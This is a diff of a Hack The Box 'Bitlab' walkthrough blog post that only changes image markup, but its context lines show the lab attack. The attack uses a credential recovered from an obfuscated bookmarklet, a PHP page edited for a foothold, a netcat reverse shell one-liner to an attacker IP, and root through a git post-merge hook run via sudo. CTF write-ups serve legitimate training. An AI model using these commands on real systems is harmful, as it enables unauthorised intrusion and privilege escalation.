@@ -68,23 +68,23 @@ PORT   STATE SERVICE REASON         VERSION
 
 This is how the site looks like.
 
-<a class="image-popup">
-![daf62219.png](/assets/images/posts/bitlab-htb-walkthrough/daf62219.png)
-</a>
+
+{% include image.html image_alt="daf62219.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/daf62219.png" %}
+
 
 ### `robots.txt`
 
 Long story short, I found an interesting file `bookmarks.html` at `/help`.
 
-<a class="image-popup">
-![0eeae026.png](/assets/images/posts/bitlab-htb-walkthrough/0eeae026.png)
-</a>
+
+{% include image.html image_alt="0eeae026.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/0eeae026.png" %}
+
 
 There's a JavaScript hyperlink at GitLab Login.
 
-<a class="image-popup">
-![e5885788.png](/assets/images/posts/bitlab-htb-walkthrough/e5885788.png)
-</a>
+
+{% include image.html image_alt="e5885788.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/e5885788.png" %}
+
 
 This is what it looks like.
 
@@ -94,9 +94,9 @@ javascript:(function(){ var _0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5
 
 It's easy to decode the above in Scratchpad.
 
-<a class="image-popup">
-![100e7322.png](/assets/images/posts/bitlab-htb-walkthrough/100e7322.png)
-</a>
+
+{% include image.html image_alt="100e7322.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/100e7322.png" %}
+
 
 As you can see, there's a credential (`clave:11des0081x`). I suppose that's for the GitLab login.
 
@@ -104,9 +104,9 @@ As you can see, there's a credential (`clave:11des0081x`). I suppose that's for 
 
 Let's give it a shot.
 
-<a class="image-popup">
-![001b2463.png](/assets/images/posts/bitlab-htb-walkthrough/001b2463.png)
-</a>
+
+{% include image.html image_alt="001b2463.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/001b2463.png" %}
+
 
 Sweet.
 
@@ -114,21 +114,21 @@ Sweet.
 
 Long story short, the creators have kindly left a PHP profile page under Settings for the purpose of getting that foothold.
 
-<a class="image-popup">
-![e92d2e0c.png](/assets/images/posts/bitlab-htb-walkthrough/e92d2e0c.png)
-</a>
+
+{% include image.html image_alt="e92d2e0c.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/e92d2e0c.png" %}
+
 
 It coincides with the Profile repository under the Administrator's projects. Simply edit `index.php` and merge it to the master branch.
 
-<a class="image-popup">
-![51c81730.png](/assets/images/posts/bitlab-htb-walkthrough/51c81730.png)
-</a>
+
+{% include image.html image_alt="51c81730.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/51c81730.png" %}
+
 
 Let's check it out.
 
-<a class="image-popup">
-![ea1271ea.png](/assets/images/posts/bitlab-htb-walkthrough/ea1271ea.png)
-</a>
+
+{% include image.html image_alt="ea1271ea.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/ea1271ea.png" %}
+
 
 ## Low-Privilege Shell
 
@@ -140,25 +140,25 @@ rm -rf /var/tmp/p; mknod /var/tmp/p p; bash </var/tmp/p | nc 10.10.13.79 1234 >/
 
 On my `nc` listening at `1234/tcp`, a reverse shell appears...
 
-<a class="image-popup">
-![bec849d7.png](/assets/images/posts/bitlab-htb-walkthrough/bec849d7.png)
-</a>
+
+{% include image.html image_alt="bec849d7.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/bec849d7.png" %}
+
 
 ## Privilege Escalation
 
 During enumeration of `www-data`'s account, I notice that `www-data` is able to `sudo` to `root` without password for `git pull`.
 
-<a class="image-popup">
-![a552c8b9.png](/assets/images/posts/bitlab-htb-walkthrough/a552c8b9.png)
-</a>
+
+{% include image.html image_alt="a552c8b9.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/a552c8b9.png" %}
+
 
 With that in mind, I wrote the following script to escalate my privileges using `git` hooks, particularly [`post-merge`](https://www.git-scm.com/docs/githooks#_post_merge).
 
 The idea is simple. Initialize one Git repository, then `git clone` it to another. Update the first one, then perform a `git pull` on the second, triggering `post-merge` with `root` privileges.
 
-<a class="image-popup">
-![bf29dabd.png](/assets/images/posts/bitlab-htb-walkthrough/bf29dabd.png)
-</a>
+
+{% include image.html image_alt="bf29dabd.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/bf29dabd.png" %}
+
 
 <div class="filename"><span>exploit.sh</span></div>
 
@@ -194,9 +194,9 @@ sudo git pull
 
 On my `nc` listening at `4321/tcp`, a `root` shell appears...
 
-<a class="image-popup">
-![6c649398.png](/assets/images/posts/bitlab-htb-walkthrough/6c649398.png)
-</a>
+
+{% include image.html image_alt="6c649398.png" image_src="/8ec3bed5-7b4a-485d-a9c5-5cef6535d315/6c649398.png" %}
+
 
 :dancer:
 
